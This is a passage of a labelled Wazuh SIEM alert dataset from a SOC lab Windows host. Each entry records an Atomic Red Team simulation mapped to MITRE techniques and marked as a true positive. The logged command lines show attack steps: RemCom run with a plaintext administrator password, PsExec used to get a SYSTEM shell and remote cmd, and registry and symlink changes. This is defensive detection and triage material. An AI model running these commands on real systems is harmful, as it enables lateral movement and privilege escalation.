[1751660806620]}}
{"id": "QRcu15cB1Hp-jZ7fM6_g", "description": "New Windows Service Created to start from windows root path. Suspicious event as the binary may have been dropped using Windows Admin Shares.", "label": "TP", "rule_level": 12, "rule_priority": "High", "alert": {"_index": "wazuh-alerts-4.x-2025.07.04", "_id": "QRcu15cB1Hp-jZ7fM6_g", "_score": null, "_source": {"input": {"type": "log"}, "agent": {"ip": "10.0.2.14", "name": "Win11Client", "id": "003"}, "manager": {"name": "wazuh-server"}, "data": {"win": {"eventdata": {"serviceType": "user mode service", "accountName": "LocalSystem", "imagePath": "%SystemRoot%\\\\PSEXESVC.exe", "startType": "demand start", "serviceName": "PSEXESVC"}, "system": {"eventID": "7045", "eventSourceName": "Service Control Manager", "keywords": "0x8080000000000000", "providerGuid": "{555908d1-a6d7-4695-8e1e-26931d2012f4}", "level": "4", "channel": "System", "opcode": "0", "message": "\"A service was installed in the system.\r\n\r\nService Name:  PSEXESVC\r\nService File Name:  %SystemRoot%\\PSEXESVC.exe\r\nService Type:  user mode service\r\nService Start Type:  demand start\r\nService Account:  LocalSystem\"", "version": "0", "systemTime": "2025-07-04T20:41:00.7795274Z", "eventRecordID": "2935", "threadID": "964", "computer": "Win11Client.soclab.internal", "task": "0", "processID": "904", "severityValue": "INFORMATION", "providerName": "Service Control Manager"}}}, "rule": {"firedtimes": 1, "mail": true, "description": "New Windows Service Created to start from windows root path. Suspicious event as the binary may have been dropped using Windows Admin Shares.", "groups": ["win_evt_channel", "windows"], "mitre": {"technique": ["SMB/Windows Admin Shares", "Service Execution"], "id": ["T1021.002", "T1569.002"], "tactic": ["Lateral Movement", "Execution"]}, "id": "92650"}, "location": "EventChannel", "decoder": {"name": "windows_eventchannel"}, "id": "1751661817.60384105", "timestamp": "2025-07-04T20:43:37.726+0000"}, "fields": {"timestamp": ["2025-07-04T20:43:37.726Z"]}, "sort": [1751661817726]}}
{"id": "QBcu15cB1Hp-jZ7fM6_g", "description": "Windows command prompt started by an abnormal process", "label": "TP", "rule_level": 4, "rule_priority": "Low", "alert": {"_index": "wazuh-alerts-4.x-2025.07.04", "_id": "QBcu15cB1Hp-jZ7fM6_g", "_score": null, "_source": {"input": {"type": "log"}, "agent": {"ip": "10.0.2.14", "name": "Win11Client", "id": "003"}, "manager": {"name": "wazuh-server"}, "data": {"win": {"eventdata": {"originalFileName": "Cmd.Exe", "image": "C:\\\\Windows\\\\System32\\\\cmd.exe", "product": "Microsoft\u00ae Windows\u00ae Operating System", "parentProcessGuid": "{ff3427f9-3c5d-6868-ef03-000000001400}", "description": "Windows Command Processor", "logonGuid": "{ff3427f9-1e69-6868-e703-000000000000}", "parentCommandLine": "C:\\\\WINDOWS\\\\PSEXESVC.exe", "processGuid": "{ff3427f9-3c5d-6868-f003-000000001400}", "logonId": "0x3e7", "parentProcessId": "4432", "processId": "9892", "currentDirectory": "C:\\\\WINDOWS\\\\system32\\\\", "utcTime": "2025-07-04 20:41:01.554", "hashes": "SHA1=09C438B2B740E73B9BCBA70AF4B8CC10A31B4EEE,MD5=59A3F41DD84517FCF809BD65FFF5E721,SHA256=AE4943E5F3F763688E10601F090B4CAE3CE19F0B427007884B40D27D7FB9274D,IMPHASH=ED799256EDA047E9421AD70A5FE3ACD6", "parentImage": "C:\\\\Windows\\\\PSEXESVC.exe", "ruleName": "technique_id=T1059,technique_name=Command-Line Interface", "company": "Microsoft Corporation", "commandLine": "\\\"cmd\\\"", "integrityLevel": "System", "fileVersion": "10.0.26100.4202 (WinBuild.160101.0800)", "user": "NT AUTHORITY\\\\SYSTEM", "terminalSessionId": "1", "parentUser": "NT AUTHORITY\\\\SYSTEM"}, "system": {"eventID": "1", "keywords": "0x8000000000000000", "providerGuid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}", "level": "4", "channel": "Microsoft-Windows-Sysmon/Operational", "opcode": "0", "message": "\"Process Create:\r\nRuleName: technique_id=T1059,technique_name=Command-Line Interface\r\nUtcTime: 2025-07-04 20:41:01.554\r\nProcessGuid: {ff3427f9-3c5d-6868-f003-000000001400}\r\nProcessId: 9892\r\nImage: C:\\Windows\\System32\\cmd.exe\r\nFileVersion: 10.0.26100.4202 (WinBuild.160101.0800)\r\nDescription: Windows Command Processor\r\nProduct: Microsoft\u00ae Windows\u00ae Operating System\r\nCompany: Microsoft Corporation\r\nOriginalFileName: Cmd.Exe\r\nCommandLine: \"cmd\" \r\nCurrentDirectory: C:\\WINDOWS\\system32\\\r\nUser: NT AUTHORITY\\SYSTEM\r\nLogonGuid: {ff3427f9-1e69-6868-e703-000000000000}\r\nLogonId: 0x3E7\r\nTerminalSessionId: 1\r\nIntegrityLevel: System\r\nHashes: SHA1=09C438B2B740E73B9BCBA70AF4B8CC10A31B4EEE,MD5=59A3F41DD84517FCF809BD65FFF5E721,SHA256=AE4943E5F3F763688E10601F090B4CAE3CE19F0B427007884B40D27D7FB9274D,IMPHASH=ED799256EDA047E9421AD70A5FE3ACD6\r\nParentProcessGuid: {ff3427f9-3c5d-6868-ef03-000000001400}\r\nParentProcessId: 4432\r\nParentImage: C:\\Windows\\PSEXESVC.exe\r\nParentCommandLine: C:\\WINDOWS\\PSEXESVC.exe\r\nParentUser: NT AUTHORITY\\SYSTEM\"", "version": "5", "systemTime": "2025-07-04T20:41:01.5579129Z", "eventRecordID": "153914", "threadID": "3992", "computer": "Win11Client.soclab.internal", "task": "1", "processID": "3056", "severityValue": "INFORMATION", "providerName": "Microsoft-Windows-Sysmon"}}}, "rule": {"firedtimes": 17, "mail": false, "description": "Windows command prompt started by an abnormal process", "groups": ["sysmon", "sysmon_eid1_detections", "windows"], "mitre": {"technique": ["Windows Command Shell"], "id": ["T1059.003"], "tactic": ["Execution"]}, "id": "92052"}, "location": "EventChannel", "decoder": {"name": "windows_eventchannel"}, "id": "1751661817.60378327", "timestamp": "2025-07-04T20:43:37.678+0000"}, "fields": {"timestamp": ["2025-07-04T20:43:37.678Z"]}, "sort": [1751661817678]}}
{"id": "Pxcu15cB1Hp-jZ7fM6_g", "description": "Evidence of new service creation found in registry under HKLM\\\\System\\\\CurrentControlSet\\\\Services\\\\PSEXESVC\\\\ImagePath binary is: %%SystemRoot%%\\\\PSEXESVC.exe", "label": "TP", "rule_level": 3, "rule_priority": "Low", "alert": {"_index": "wazuh-alerts-4.x-2025.07.04", "_id": "Pxcu15cB1Hp-jZ7fM6_g", "_score": null, "_source": {"input": {"type": "log"}, "agent": {"ip": "10.0.2.14", "name": "Win11Client", "id": "003"}, "manager": {"name": "wazuh-server"}, "data": {"win": {"eventdata": {"image": "C:\\\\WINDOWS\\\\system32\\\\services.exe", "targetObject": "HKLM\\\\System\\\\CurrentControlSet\\\\Services\\\\PSEXESVC\\\\ImagePath", "processGuid": "{ff3427f9-1e68-6868-0b00-000000001400}", "processId": "904", "utcTime": "2025-07-04 20:41:00.776", "details": "%%SystemRoot%%\\\\PSEXESVC.exe", "eventType": "SetValue", "user": "NT AUTHORITY\\\\SYSTEM"}, "system": {"eventID": "13", "keywords": "0x8000000000000000", "providerGuid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}", "level": "4", "channel": "Microsoft-Windows-Sysmon/Operational", "opcode": "0", "message": "\"Registry value set:\r\nRuleName: -\r\nEventType: SetValue\r\nUtcTime: 2025-07-04 20:41:00.776\r\nProcessGuid: {ff3427f9-1e68-6868-0b00-000000001400}\r\nProcessId: 904\r\nImage: C:\\WINDOWS\\system32\\services.exe\r\nTargetObject: HKLM\\System\\CurrentControlSet\\Services\\PSEXESVC\\ImagePath\r\nDetails: %%SystemRoot%%\\PSEXESVC.exe\r\nUser: NT AUTHORITY\\SYSTEM\"", "version": "2", "systemTime": "2025-07-04T20:41:00.7793648Z", "eventRecordID": "153900", "threadID": "3992", "computer": "Win11Client.soclab.internal", "task": "13", "processID": "3056", "severityValue": "INFORMATION", "providerName": "Microsoft-Windows-Sysmon"}}}, "rule": {"firedtimes": 3, "mail": false, "description": "Evidence of new service creation found in registry under HKLM\\\\System\\\\CurrentControlSet\\\\Services\\\\PSEXESVC\\\\ImagePath binary is: %%SystemRoot%%\\\\PSEXESVC.exe", "groups": ["sysmon", "sysmon_eid13_detections", "windows"], "mitre": {"technique": ["Windows Service"], "id": ["T1543.003"], "tactic": ["Persistence", "Privilege Escalation"]}, "id": "92307"}, "location": "EventChannel", "decoder": {"name": "windows_eventchannel"}, "id": "1751661817.60375511", "timestamp": "2025-07-04T20:43:37.453+0000"}, "fields": {"timestamp": ["2025-07-04T20:43:37.453Z"]}, "sort": [1751661817453]}}
{"id": "Mxcu15cB1Hp-jZ7fIK9Q", "description": "Suspicious Windows cmd shell execution", "label": "TP", "rule_level": 3, "rule_priority": "Low", "alert": {"_index": "wazuh-alerts-4.x-2025.07.04", "_id": "Mxcu15cB1Hp-jZ7fIK9Q", "_score": null, "_source": {"input": {"type": "log"}, "agent": {"ip": "10.0.2.14", "name": "Win11Client", "id": "003"}, "manager": {"name": "wazuh-server"}, "data": {"win": {"eventdata": {"originalFileName": "RemCom.exe", "image": "C:\\\\AtomicRedTeam\\\\ExternalPayloads\\\\remcom.exe", "product": "Remote System Deployment Util", "parentProcessGuid": "{ff3427f9-3c55-6868-e003-000000001400}", "description": "Remote Command Executor", "logonGuid": "{ff3427f9-1e7f-6868-f045-0a0000000000}", "parentCommandLine": "\\\"cmd.exe\\\" /c \\\"C:\\\\AtomicRedTeam\\\\atomics\\\\..\\\\ExternalPayloads\\\\remcom.exe\\\" \\\\\\\\localhost /user:Administrator /pwd:P@ssw0rd1 cmd.exe", "processGuid": "{ff3427f9-3c55-6868-e203-000000001400}", "logonId": "0xa45f0", "parentProcessId": "8088", "processId": "3676", "currentDirectory": "C:\\\\Users\\\\snell\\\\AppData\\\\Local\\\\Temp\\\\", "utcTime": "2025-07-04 20:40:53.446", "hashes": "SHA1=109F4B85B56A6E91003234E408FFF972F2F79C43,MD5=014CF8D63AB7203B6E7212892C0FD846,SHA256=85231BA8A267677791B7C2E77D957070430A9EA1BE5EEF8C0848C33FF6B0E88D,IMPHASH=0A44B1625136888899F8B66D3F16496B", "parentImage": "C:\\\\Windows\\\\System32\\\\cmd.exe", "ruleName": "technique_id=T1059,technique_name=Command-Line Interface", "company": "Talha Tariq - [ talhatariq.wordpress.com ]", "commandLine": "C:\\\\AtomicRedTeam\\\\atomics\\\\..\\\\ExternalPayloads\\\\remcom.exe  \\\\\\\\localhost /user:Administrator /pwd:P@ssw0rd1 cmd.exe", "integrityLevel": "High", "fileVersion": "1, 0, 0, 1", "user": "SOCLAB\\\\snell", "terminalSessionId": "1", "parentUser": "SOCLAB\\\\snell"}, "system": {"eventID": "1", "keywords": "0x8000000000000000", "providerGuid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}", "level": "4", "channel": "Microsoft-Windows-Sysmon/Operational", "opcode": "0", "message": "\"Process Create:\r\nRuleName: technique_id=T1059,technique_name=Command-Line Interface\r\nUtcTime: 2025-07-04 20:40:53.446\r\nProcessGuid: {ff3427f9-3c55-6868-e203-000000001400}\r\nProcessId: 3676\r\nImage: C:\\AtomicRedTeam\\ExternalPayloads\\remcom.exe\r\nFileVersion: 1, 0, 0, 1\r\nDescription: Remote Command Executor\r\nProduct: Remote System Deployment Util\r\nCompany: Talha Tariq - [ talhatariq.wordpress.com ]\r\nOriginalFileName: RemCom.exe\r\nCommandLine: C:\\AtomicRedTeam\\atomics\\..\\ExternalPayloads\\remcom.exe  \\\\localhost /user:Administrator /pwd:P@ssw0rd1 cmd.exe\r\nCurrentDirectory: C:\\Users\\snell\\AppData\\Local\\Temp\\\r\nUser: SOCLAB\\snell\r\nLogonGuid: {ff3427f9-1e7f-6868-f045-0a0000000000}\r\nLogonId: 0xA45F0\r\nTerminalSessionId: 1\r\nIntegrityLevel: High\r\nHashes: SHA1=109F4B85B56A6E91003234E408FFF972F2F79C43,MD5=014CF8D63AB7203B6E7212892C0FD846,SHA256=85231BA8A267677791B7C2E77D957070430A9EA1BE5EEF8C0848C33FF6B0E88D,IMPHASH=0A44B1625136888899F8B66D3F16496B\r\nParentProcessGuid: {ff3427f9-3c55-6868-e003-000000001400}\r\nParentProcessId: 8088\r\nParentImage: C:\\Windows\\System32\\cmd.exe\r\nParentCommandLine: \"cmd.exe\" /c \"C:\\AtomicRedTeam\\atomics\\..\\ExternalPayloads\\remcom.exe\" \\\\localhost /user:Administrator /pwd:P@ssw0rd1 cmd.exe\r\nParentUser: SOCLAB\\snell\"", "version": "5", "systemTime": "2025-07-04T20:40:53.4516962Z", "eventRecordID": "153835", "threadID": "3992", "computer": "Win11Client.soclab.internal", "task": "1", "processID": "3056", "severityValue": "INFORMATION", "providerName": "Microsoft-Windows-Sysmon"}}}, "rule": {"firedtimes": 11, "mail": false, "description": "Suspicious Windows cmd shell execution", "groups": ["sysmon", "sysmon_eid1_detections", "windows"], "mitre": {"technique": ["Account Discovery", "Windows Command Shell"], "id": ["T1087", "T1059.003"], "tactic": ["Discovery", "Execution"]}, "id": "92032"}, "location": "EventChannel", "decoder": {"name": "windows_eventchannel"}, "id": "1751661812.60311376", "timestamp": "2025-07-04T20:43:32.512+0000"}, "fields": {"timestamp": ["2025-07-04T20:43:32.512Z"]}, "sort": [1751661812512]}}
{"id": "LRcu15cB1Hp-jZ7fEK-x", "description": "Value added to registry key has Base64-like pattern", "label": "TP", "rule_level": 10, "rule_priority": "Medium", "alert": {"_index": "wazuh-alerts-4.x-2025.07.04", "_id": "LRcu15cB1Hp-jZ7fEK-x", "_score": null, "_source": {"input": {"type": "log"}, "agent": {"ip": "10.0.2.14", "name": "Win11Client", "id": "003"}, "manager": {"name": "wazuh-server"}, "data": {"win": {"eventdata": {"originalFileName": "reg.exe", "image": "C:\\\\Windows\\\\System32\\\\reg.exe", "product": "Microsoft\u00ae Windows\u00ae Operating System", "parentProcessGuid": "{ff3427f9-3c4d-6868-d403-000000001400}", "description": "Registry Console Tool", "logonGuid": "{ff3427f9-1e7f-6868-f045-0a0000000000}", "parentCommandLine": "\\\"powershell.exe\\\" &amp; {cmd.exe /c \\\\\\\"\\\"wmic \\tcsproduct \\tget UUID\\\\\\\"\\\"  cmd.exe /c \\\\\\\"\\\"fsutil behavior \\tset SymlinkEvaluation R2L:1\\\\\\\"\\\"  cmd.exe /c \\\\\\\"\\\"fsutil behavior set \\tSymlinkEvaluation R2R:1\\\\\\\"\\\" reg    add    HKEY_LOCAL_MACHINE\\\\SYSTEM\\\\CurrentControlSet\\\\Services\\\\LanmanServer\\\\Parameters    /v MaxMpxCt /d 65535 /t REG_DWORD /f       copy \\\\\\\"\\\"C:\\\\AtomicRedTeam\\\\atomics\\\\..\\\\ExternalPayloads\\\\PsExec.exe\\\\\\\"\\\" $env:temp cmd.exe /c \\\\\\\"\\\"$env:temp\\\\psexec.exe  -accepteula  \\\\\\\\$ENV:COMPUTERNAME cmd.exe  /c echo \\\\\\\"\\\"--access-token\\\\\\\"\\\"\\\\\\\"\\\"}", "processGuid": "{ff3427f9-3c4e-6868-db03-000000001400}", "logonId": "0xa45f0", "parentProcessId": "7260", "processId": "3396", "currentDirectory": "C:\\\\Users\\\\snell\\\\AppData\\\\Local\\\\Temp\\\\", "utcTime": "2025-07-04 20:40:46.584", "hashes": "SHA1=0B0C075EAEA780D3A1649169D3B7D9AB698AEA03,MD5=47FC2471604EB7D760938BF31456B12D,SHA256=321590E79C53AA24B197F08A21A0329E5AB9F212B2BD748AF09A7BE6F838F585,IMPHASH=3B322244D4C64F3C932F94E6E3457771", "parentImage": "C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe", "ruleName": "technique_id=T1112,technique_name=Modify Registry", "company": "Microsoft Corporation", "commandLine": "\\\"C:\\\\WINDOWS\\\\system32\\\\reg.exe\\\" add HKEY_LOCAL_MACHINE\\\\SYSTEM\\\\CurrentControlSet\\\\Services\\\\LanmanServer\\\\Parameters /v MaxMpxCt /d 65535 /t REG_DWORD /f", "integrityLevel": "High", "fileVersion": "10.0.26100.1882 (WinBuild.160101.0800)", "user": "SOCLAB\\\\snell", "terminalSessionId": "1", "parentUser": "SOCLAB\\\\snell"}, "system": {"eventID": "1", "keywords": "0x8000000000000000", "providerGuid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}", "level": "4", "channel": "Microsoft-Windows-Sysmon/Operational", "opcode": "0", "message": "\"Process Create:\r\nRuleName: technique_id=T1112,technique_name=Modify Registry\r\nUtcTime: 2025-07-04 20:40:46.584\r\nProcessGuid: {ff3427f9-3c4e-6868-db03-000000001400}\r\nProcessId: 3396\r\nImage: C:\\Windows\\System32\\reg.exe\r\nFileVersion: 10.0.26100.1882 (WinBuild.160101.0800)\r\nDescription: Registry Console Tool\r\nProduct: Microsoft\u00ae Windows\u00ae Operating System\r\nCompany: Microsoft Corporation\r\nOriginalFileName: reg.exe\r\nCommandLine: \"C:\\WINDOWS\\system32\\reg.exe\" add HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\LanmanServer\\Parameters /v MaxMpxCt /d 65535 /t REG_DWORD /f\r\nCurrentDirectory: C:\\Users\\snell\\AppData\\Local\\Temp\\\r\nUser: SOCLAB\\snell\r\nLogonGuid: {ff3427f9-1e7f-6868-f045-0a0000000000}\r\nLogonId: 0xA45F0\r\nTerminalSessionId: 1\r\nIntegrityLevel: High\r\nHashes: SHA1=0B0C075EAEA780D3A1649169D3B7D9AB698AEA03,MD5=47FC2471604EB7D760938BF31456B12D,SHA256=321590E79C53AA24B197F08A21A0329E5AB9F212B2BD748AF09A7BE6F838F585,IMPHASH=3B322244D4C64F3C932F94E6E3457771\r\nParentProcessGuid: {ff3427f9-3c4d-6868-d403-000000001400}\r\nParentProcessId: 7260\r\nParentImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\r\nParentCommandLine: \"powershell.exe\" & {cmd.exe /c \\\"\"wmic \tcsproduct \tget UUID\\\"\" \ncmd.exe /c \\\"\"fsutil behavior \tset SymlinkEvaluation R2L:1\\\"\" \ncmd.exe /c \\\"\"fsutil behavior set \tSymlinkEvaluation R2R:1\\\"\"\nreg    add    HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\LanmanServer\\Parameters    /v MaxMpxCt /d 65535 /t REG_DWORD /f      \ncopy \\\"\"C:\\AtomicRedTeam\\atomics\\..\\ExternalPayloads\\PsExec.exe\\\"\" $env:temp\ncmd.exe /c \\\"\"$env:temp\\psexec.exe  -accepteula  \\\\$ENV:COMPUTERNAME cmd.exe  /c echo \\\"\"--access-token\\\"\"\\\"\"}\r\nParentUser: SOCLAB\\snell\"", "version": "5", "systemTime": "2025-07-04T20:40:46.5895699Z", "eventRecordID": "153807", "threadID": "3992", "computer": "Win11Client.soclab.internal", "task": "1", "processID": "3056", "severityValue": "INFORMATION", "providerName": "Microsoft-Windows-Sysmon"}}}, "rule": {"firedtimes": 2, "mail": false, "description": "Value added to registry key has Base64-like pattern", "groups": ["sysmon", "sysmon_eid1_detections", "windows"], "mitre": {"technique": ["Obfuscated Files or Information", "Modify Registry"], "id": ["T1027", "T1112"], "tactic": ["Defense Evasion"]}, "id": "92041"}, "location": "EventChannel", "decoder": {"name": "windows_eventchannel"}, "id": "1751661808.60271475", "timestamp": "2025-07-04T20:43:28.076+0000"}, "fields": {"timestamp": ["2025-07-04T20:43:28.076Z"]}, "sort": [1751661808076]}}
{"id": "KBcu15cB1Hp-jZ7fEK-x", "description": "Powershell process spawned Windows command shell instance", "label": "TP", "rule_level": 4, "rule_priority": "Low", "alert": {"_index": "wazuh-alerts-4.x-2025.07.04", "_id": "KBcu15cB1Hp-jZ7fEK-x", "_score": null, "_source": {"input": {"type": "log"}, "agent": {"ip": "10.0.2.14", "name": "Win11Client", "id": "003"}, "manager": {"name": "wazuh-server"}, "data": {"win": {"eventdata": {"originalFileName": "Cmd.Exe", "image": "C:\\\\Windows\\\\System32\\\\cmd.exe", "product": "Microsoft\u00ae Windows\u00ae Operating System", "parentProcessGuid": "{ff3427f9-3c4d-6868-d403-000000001400}", "description": "Windows Command Processor", "logonGuid": "{ff3427f9-1e7f-6868-f045-0a0000000000}", "parentCommandLine": "\\\"powershell.exe\\\" &amp; {cmd.exe /c \\\\\\\"\\\"wmic \\tcsproduct \\tget UUID\\\\\\\"\\\"  cmd.exe /c \\\\\\\"\\\"fsutil behavior \\tset SymlinkEvaluation R2L:1\\\\\\\"\\\"  cmd.exe /c \\\\\\\"\\\"fsutil behavior set \\tSymlinkEvaluation R2R:1\\\\\\\"\\\" reg    add    HKEY_LOCAL_MACHINE\\\\SYSTEM\\\\CurrentControlSet\\\\Services\\\\LanmanServer\\\\Parameters    /v MaxMpxCt /d 65535 /t REG_DWORD /f       copy \\\\\\\"\\\"C:\\\\AtomicRedTeam\\\\atomics\\\\..\\\\ExternalPayloads\\\\PsExec.exe\\\\\\\"\\\" $env:temp cmd.exe /c \\\\\\\"\\\"$env:temp\\\\psexec.exe  -accepteula  \\\\\\\\$ENV:COMPUTERNAME cmd.exe  /c echo \\\\\\\"\\\"--access-token\\\\\\\"\\\"\\\\\\\"\\\"}", "processGuid": "{ff3427f9-3c4e-6868-d603-000000001400}", "logonId": "0xa45f0", "parentProcessId": "7260", "processId": "8044", "currentDirectory": "C:\\\\Users\\\\snell\\\\AppData\\\\Local\\\\Temp\\\\", "utcTime": "2025-07-04 20:40:46.325", "hashes": "SHA1=09C438B2B740E73B9BCBA70AF4B8CC10A31B4EEE,MD5=59A3F41DD84517FCF809BD65FFF5E721,SHA256=AE4943E5F3F763688E10601F090B4CAE3CE19F0B427007884B40D27D7FB9274D,IMPHASH=ED799256EDA047E9421AD70A5FE3ACD6", "parentImage": "C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe", "ruleName": "technique_id=T1059,technique_name=Command-Line Interface", "company": "Microsoft Corporation", "commandLine": "\\\"C:\\\\WINDOWS\\\\system32\\\\cmd.exe\\\" /c \\\"wmic \\tcsproduct \\tget UUID\\\"", "integrityLevel": "High", "fileVersion": "10.0.26100.4202 (WinBuild.160101.0800)", "user": "SOCLAB\\\\snell", "terminalSessionId": "1", "parentUser": "SOCLAB\\\\snell"}, "system": {"eventID": "1", "keywords": "0x8000000000000000", "providerGuid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}", "level": "4", "channel": "Microsoft-Windows-Sysmon/Operational", "opcode": "0", "message": "\"Process Create:\r\nRuleName: technique_id=T1059,technique_name=Command-Line Interface\r\nUtcTime: 2025-07-04 20:40:46.325\r\nProcessGuid: {ff3427f9-3c4e-6868-d603-000000001400}\r\nProcessId: 8044\r\nImage: C:\\Windows\\System32\\cmd.exe\r\nFileVersion: 10.0.26100.4202 (WinBuild.160101.0800)\r\nDescription: Windows Command Processor\r\nProduct: Microsoft\u00ae Windows\u00ae Operating System\r\nCompany: Microsoft Corporation\r\nOriginalFileName: Cmd.Exe\r\nCommandLine: \"C:\\WINDOWS\\system32\\cmd.exe\" /c \"wmic \tcsproduct \tget UUID\"\r\nCurrentDirectory: C:\\Users\\snell\\AppData\\Local\\Temp\\\r\nUser: SOCLAB\\snell\r\nLogonGuid: {ff3427f9-1e7f-6868-f045-0a0000000000}\r\nLogonId: 0xA45F0\r\nTerminalSessionId: 1\r\nIntegrityLevel: High\r\nHashes: SHA1=09C438B2B740E73B9BCBA70AF4B8CC10A31B4EEE,MD5=59A3F41DD84517FCF809BD65FFF5E721,SHA256=AE4943E5F3F763688E10601F090B4CAE3CE19F0B427007884B40D27D7FB9274D,IMPHASH=ED799256EDA047E9421AD70A5FE3ACD6\r\nParentProcessGuid: {ff3427f9-3c4d-6868-d403-000000001400}\r\nParentProcessId: 7260\r\nParentImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\r\nParentCommandLine: \"powershell.exe\" & {cmd.exe /c \\\"\"wmic \tcsproduct \tget UUID\\\"\" \ncmd.exe /c \\\"\"fsutil behavior \tset SymlinkEvaluation R2L:1\\\"\" \ncmd.exe /c \\\"\"fsutil behavior set \tSymlinkEvaluation R2R:1\\\"\"\nreg    add    HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\LanmanServer\\Parameters    /v MaxMpxCt /d 65535 /t REG_DWORD /f      \ncopy \\\"\"C:\\AtomicRedTeam\\atomics\\..\\ExternalPayloads\\PsExec.exe\\\"\" $env:temp\ncmd.exe /c \\\"\"$env:temp\\psexec.exe  -accepteula  \\\\$ENV:COMPUTERNAME cmd.exe  /c echo \\\"\"--access-token\\\"\"\\\"\"}\r\nParentUser: SOCLAB\\snell\"", "version": "5", "systemTime": "2025-07-04T20:40:46.3285508Z", "eventRecordID": "153792", "threadID": "3992", "computer": "Win11Client.soclab.internal", "task": "1", "processID": "3056", "severityValue": "INFORMATION", "providerName": "Microsoft-Windows-Sysmon"}}}, "rule": {"firedtimes": 3, "mail": false, "description": "Powershell process spawned Windows command shell instance", "groups": ["sysmon", "sysmon_eid1_detections", "windows"], "mitre": {"technique": ["Windows Command Shell"], "id": ["T1059.003"], "tactic": ["Execution"]}, "id": "92004"}, "location": "EventChannel", "decoder": {"name": "windows_eventchannel"}, "id": "1751661807.60233672", "timestamp": "2025-07-04T20:43:27.843+0000"}, "fields": {"timestamp": ["2025-07-04T20:43:27.843Z"]}, "sort": [1751661807843]}}
{"id": "dRcz15cB1Hp-jZ7f4a9t", "description": "Powershell process spawned powershell instance", "label": "TP", "rule_level": 4, "rule_priority": "Low", "alert": {"_index": "wazuh-alerts-4.x-2025.07.04", "_id": "dRcz15cB1Hp-jZ7f4a9t", "_score": null, "_source": {"input": {"type": "log"}, "agent": {"ip": "10.0.2.14", "name": "Win11Client", "id": "003"}, "manager": {"name": "wazuh-server"}, "data": {"win": {"eventdata": {"originalFileName": "PowerShell.EXE", "image": "C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe", "product": "Microsoft\u00ae Windows\u00ae Operating System", "parentProcessGuid": "{ff3427f9-2077-6868-5c01-000000001400}", "description": "Windows PowerShell", "logonGuid": "{ff3427f9-1e7f-6868-f045-0a0000000000}", "parentCommandLine": "\\\"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\\\"", "processGuid": "{ff3427f9-3e6d-6868-f903-000000001400}", "logonId": "0xa45f0", "parentProcessId": "9196", "processId": "5124", "currentDirectory": "C:\\\\Users\\\\snell\\\\AppData\\\\Local\\\\Temp\\\\", "utcTime": "2025-07-04 20:49:49.386", "hashes": "SHA1=8B595BBBF8695CE90EEEA612B440ECC79ACC6C5D,MD5=BD542C1197F3B5217B5C5B5C4A25BD0C,SHA256=75F490D70F821AFBBBB28D8AE45FA712C0EF39F73832AF5FF0DF284BEB22A9FC,IMPHASH=AFACF6DC9041114B198160AAB4D0AE77", "parentImage": "C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe", "ruleName": "technique_id=T1086,technique_name=PowerShell", "company": "Microsoft Corporation", "commandLine": "\\\"powershell.exe\\\" &amp; {cd C:\\\\Users\\\\Public\\\\Temp\\\\  .\\\\PsExec.exe -i -s cmd  -accepteula}", "integrityLevel": "High", "fileVersion": "10.0.26100.3323 (WinBuild.160101.0800)", "user": "SOCLAB\\\\snell", "terminalSessionId": "1", "parentUser": "SOCLAB\\\\snell"}, "system": {"eventID": "1", "keywords": "0x8000000000000000", "providerGuid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}", "level": "4", "channel": "Microsoft-Windows-Sysmon/Operational", "opcode": "0", "message": "\"Process Create:\r\nRuleName: technique_id=T1086,technique_name=PowerShell\r\nUtcTime: 2025-07-04 20:49:49.386\r\nProcessGuid: {ff3427f9-3e6d-6868-f903-000000001400}\r\nProcessId: 5124\r\nImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\r\nFileVersion: 10.0.26100.3323 (WinBuild.160101.0800)\r\nDescription: Windows PowerShell\r\nProduct: Microsoft\u00ae Windows\u00ae Operating System\r\nCompany: Microsoft Corporation\r\nOriginalFileName: PowerShell.EXE\r\nCommandLine: \"powershell.exe\" & {cd C:\\Users\\Public\\Temp\\ \n.\\PsExec.exe -i -s cmd  -accepteula}\r\nCurrentDirectory: C:\\Users\\snell\\AppData\\Local\\Temp\\\r\nUser: SOCLAB\\snell\r\nLogonGuid: {ff3427f9-1e7f-6868-f045-0a0000000000}\r\nLogonId: 0xA45F0\r\nTerminalSessionId: 1\r\nIntegrityLevel: High\r\nHashes: SHA1=8B595BBBF8695CE90EEEA612B440ECC79ACC6C5D,MD5=BD542C1197F3B5217B5C5B5C4A25BD0C,SHA256=75F490D70F821AFBBBB28D8AE45FA712C0EF39F73832AF5FF0DF284BEB22A9FC,IMPHASH=AFACF6DC9041114B198160AAB4D0AE77\r\nParentProcessGuid: {ff3427f9-2077-6868-5c01-000000001400}\r\nParentProcessId: 9196\r\nParentImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\r\nParentCommandLine: \"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" \r\nParentUser: SOCLAB\\snell\"", "version": "5", "systemTime": "2025-07-04T20:49:49.3883763Z", "eventRecordID": "154183", "threadID": "3992", "computer": "Win11Client.soclab.internal", "task": "1", "processID": "3056", "severityValue": "INFORMATION", "providerName": "Microsoft-Windows-Sysmon"}}}, "rule": {"firedtimes": 68, "mail": false, "description": "Powershell process spawned powershell instance", "groups": ["sysmon", "sysmon_eid1_detections", "windows"], "mitre": {"technique": ["PowerShell"], "id": ["T1059.001"], "tactic": ["Execution"]}, "id": "92027"}, "location": 